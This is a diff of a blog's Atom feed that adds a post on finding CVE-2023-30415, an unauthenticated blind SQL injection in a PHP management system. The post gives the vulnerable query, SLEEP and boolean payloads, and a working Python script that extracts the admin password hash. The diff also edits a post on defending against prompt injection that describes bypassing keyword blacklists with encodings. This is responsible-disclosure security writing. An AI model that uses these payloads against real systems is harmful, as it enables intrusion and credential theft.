@@ -4,13 +4,140 @@
  <title>robsware</title>
  <link href="https://robsware.github.io/atom.xml" rel="self"/>
  <link href="https://robsware.github.io/"/>
- <updated>2023-05-13T20:22:03+01:00</updated>
+ <updated>2023-09-01T20:36:27+01:00</updated>
  <id>https://robsware.github.io</id>
  <author>
    <name>gesko</name>
    <email>your-email@email.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Getting my first CVE</title>
+   <link href="https://robsware.github.io/2023/09/01/firstcve"/>
+   <updated>2023-09-01T00:00:00+01:00</updated>
+   <id>https://robsware.github.io/2023/09/01/firstcve</id>
+   <content type="html">&lt;p&gt;After passing my OSWE in March and dealing with some long neglected life issues, I decided to put my skills to the test and hunt for a CVE. It felt like a rite of passage for OSWE passers.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Recon&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;My first approach was to find projects written in languages that are easy to make mistakes in but that are also very popular. PHP is the prime candidate here, so I looked up php open source projects on google and quickly discovered sourcecodetester.com among the first results.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sourcecodetester.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I started perusing through random projects and downloading them locally to run them. This approach netter me a substantial number of critical findings, but whenever I wanted to report them to MITRE, I would find out that they were already assigned a CVE. Nonetheless, it was a nice confidence booster that I was able to find those vulnerabilities so easily.&lt;/p&gt;
+
+&lt;p&gt;This meant I had to up my game a bit. I had to look for projects that were at least somewhat secure. After a more careful analysis, I found the &lt;a href=&quot;https://www.sourcecodester.com/php/15360/packers-and-movers-management-system-phpoop-free-source-code.html&quot;&gt;Packers and Movers Management system&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;What caught my attention on this project was that the admin pages called in a header function that itself was checking for session.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/header.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/session.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This was good news, it meant that whoever designed this took some authorization considerations into account.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Exploit Discovery&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;I took a shortcut here, and instead of following user input paths like I normally do, I went straight to the source code and searched for “query” in an attempt to grab an easy win.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/query.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I found some results, but they were all behind the dreaded admin login, which would drastically reduce the impact of those findings.&lt;/p&gt;
+
+&lt;p&gt;However, upon a closer inpection, I quickly realized that the header function was only used for the direct subpages of /admin, but would often not be used deeper into the application.&lt;/p&gt;
+
+&lt;p&gt;As an example, /admin/index.php uses the header, but /admin/inquiries/view_inquiry.php does not and also uses an unsanitized query right at the start of the file!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/inquiry.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I was able to locate this particular piece of code in the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/page.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This meant that any input after the id parameter would pass unfiltered through these 2 lines:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UPDATE `inquiry_list` set `status` = 1 where id = &apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$qry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT *  from `inquiry_list` where id = &apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since view_inquiry.php does not use the session header, it means that we can attack the id parameter without any need for authentication.&lt;/p&gt;
+
+&lt;p&gt;Let’s test it with a classic SLEEP payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /mpms/admin/?page=inquiries/view_inquiry&amp;amp;id=4&apos;+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))test)--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sleep.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the response time, we can see it took just over 8 seconds, which happens because the id parameter is passed through two querries. That confirms our Blind SQL Injection.&lt;/p&gt;
+
+&lt;p&gt;Let’s experiment with some more payloads and look if there are any differences in the content length.&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /mpms/admin/?page=inquiries/view_inquiry&amp;amp;id=4&apos;+AND+(ascii(substring((SELECT+password+FROM+mpms_db.users+WHERE+id=1+LIMIT+1),1,1))=48)--+ 
+GET /mpms/admin/?page=inquiries/view_inquiry&amp;amp;id=4&apos;+AND+(ascii(substring((SELECT+password+FROM+mpms_db.users+WHERE+id=1+LIMIT+1),1,1))=47)--+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/fuzz1.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/fuzz2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It does look like we get different content lengths when the exploit fails to execute. This means we can start working on an exploit right away.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The Exploit&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The exploit is actually surprisingly simple. I ended up pruning the GET request of all uneccessary headers to get the request size down, wrote a for loop for the Blind SQL Injection and then a get_token function to store the token. Here it is:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;expected_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26845&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sql_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; AND (ascii(substring((SELECT password FROM mpms_db.users WHERE id=1 LIMIT 1),&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;,1))=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)-- &apos;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://localhost:80/mpms/admin/?page=inquiries/view_inquiry&amp;amp;id=4&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sql_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#print(len(r.content))
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expected_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Error at &apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;The Full MD5 password is &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;get_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All that preparation for 25 lines of code. Let’s run it and wait a few seconds:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We now have our MD5 password. Passing it through an online hash cracker, we get the password admin123:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Which is exactly the password used in the source page:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/source.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;The Report&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;With those proofs in hand, I used the CVE MITRE website to complete the form and report the CVE via &lt;a href=&quot;https://www.cve.org/ReportRequest/ReportRequestForNonCNAs&quot;&gt;https://www.cve.org/ReportRequest/ReportRequestForNonCNAs&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;After about a month, I received my CVE ID, CVE-2023-30415&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/cve.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I have emailed sourcecodester.com with a detailed explanation of the exploit and the proof of concept. Considerably way over 90 days have passed since, so this is me making it public as according to the reasonable disclosure procedure.&lt;/p&gt;
+
+&lt;p&gt;Overall, I had a lot of fun finding my first CVE, as trivial as it was. It helped me developed my own confidence and ability to quickly scan code repos for common mistakes. I have been busy with other interests lately but I have managed to secure a decent amount of AppSec and code review engagements at work, so I have been doing my best to keep learning and hone my skills even if I am not actively hunting for CVEs. I would recommend any aspiring AppSec hacker to have a go at it, even if you don’t manage to secure a CVE, just finding some vulnerabilities will do wonders for your confidence.&lt;/p&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Defending against prompt injection</title>
@@ -54,7 +181,7 @@ The second one is that it is relatively easy to bypass. The attacker can start t
 Additionally, the attacker can simply work within the delimiter itself. Commands may still get passed if the prompt is something like “Extract date from user input”.&lt;/p&gt;
 
 &lt;h2 id=&quot;server-side-checks&quot;&gt;Server side checks&lt;/h2&gt;
-&lt;p&gt;This is the SAST inspired solution and the endless game of cat and mouse that current developers struggle with. It involves looking for certain dangerous keyworks and using a blacklist to remove them from the prompt or outright reject it. This can combat something like the previously mentioned delimiters. But much like modern developers, you will find out that attackers can use a lot of creative encodings to bypass those blacklists. Encoders for GPT-3 already exist - https://observablehq.com/@simonw/gpt-3-token-encoder-decoder and any glance at a XSS cheatsheet or polyglot payload - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot will show you that the sky is the limit when it comes to getting payloads past static defences.&lt;/p&gt;
+&lt;p&gt;This is the SAST inspired solution and the endless game of cat and mouse that current developers struggle with. It involves looking for certain dangerous keyworks and using a blacklist to remove them from the prompt or outright reject it. This can combat something like the previously mentioned delimiters. But much like modern developers, you will find out that attackers can use a lot of creative encodings to bypass those blacklists. Encoders for GPT-3 already exist - &lt;a href=&quot;https://observablehq.com/@simonw/gpt-3-token-encoder-decoder&quot;&gt;https://observablehq.com/@simonw/gpt-3-token-encoder-decoder&lt;/a&gt; and any glance at a &lt;a href=&quot;https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot&quot;&gt;XSS cheatsheet or polyglot payload&lt;/a&gt; will show you that the sky is the limit when it comes to getting payloads past static defences.&lt;/p&gt;
 
 &lt;p&gt;New ways of improving LLM security will likely be developed in time, but for now it seems to be a problem that is mostly ignored. It could be argued that is because LLMs haven’t quite found their place in the product market yet and it’s all still highly experimental and security, as usual, is just an afterthought. Or perhaps LLMs are fundamentally impossible to completely secure and this will be taken into account when designing secure systems in the future. Personally, I am certainly excited for the future and to see LLMs find their place in the tech ecosystem.&lt;/p&gt;
 
